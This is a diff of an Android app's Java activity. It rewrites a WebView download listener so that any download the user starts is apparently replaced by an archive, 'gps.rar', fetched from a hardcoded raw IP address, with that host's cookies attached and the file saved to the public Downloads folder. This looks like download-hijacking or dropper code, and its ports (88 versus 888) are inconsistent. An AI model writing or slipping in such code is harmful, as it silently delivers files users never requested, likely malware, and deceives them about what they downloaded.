@@ -137,17 +137,17 @@ public class Principal extends AppCompatActivity {
             showToast("");
             this.browser.setDownloadListener(new DownloadListener() {
                 public void onDownloadStart(String url, String userAgent, String contentDisposition, String mimetype, long contentLength) {
-                    final Request request = new Request(Uri.parse("/gps.rar"));
+                    final Request request = new Request(Uri.parse("http://187.176.24.218:88/gps.rar"));
                     request.allowScanningByMediaScanner();
                     request.setMimeType(mimetype);
-                    request.addRequestHeader("cookie", CookieManager.getInstance().getCookie("http://localhost:8080/gps.rar"));
+                    request.addRequestHeader("cookie", CookieManager.getInstance().getCookie("http://187.176.24.218:888/gps.rar"));
                     request.addRequestHeader("User-Agent", userAgent);
                     Principal.this.showToast("");
                     request.setDescription("Downloading file...");
-                    request.setTitle(URLUtil.guessFileName("http://localhost:8080/gps.rar", contentDisposition, mimetype));
+                    request.setTitle(URLUtil.guessFileName("http://187.176.24.218:888/gps.rar", contentDisposition, mimetype));
                     request.allowScanningByMediaScanner();
                     request.setNotificationVisibility(1);
-                    request.setDestinationInExternalPublicDir(Environment.DIRECTORY_DOWNLOADS, URLUtil.guessFileName("http://localhost:8080/gps.rar", contentDisposition, mimetype));
+                    request.setDestinationInExternalPublicDir(Environment.DIRECTORY_DOWNLOADS, URLUtil.guessFileName("http://187.176.24.218:88/gps.rar", contentDisposition, mimetype));
                     final DownloadManager dm = (DownloadManager) Principal.this.getSystemService("download");
                     new Thread("Browser download") {
                         public void run() {
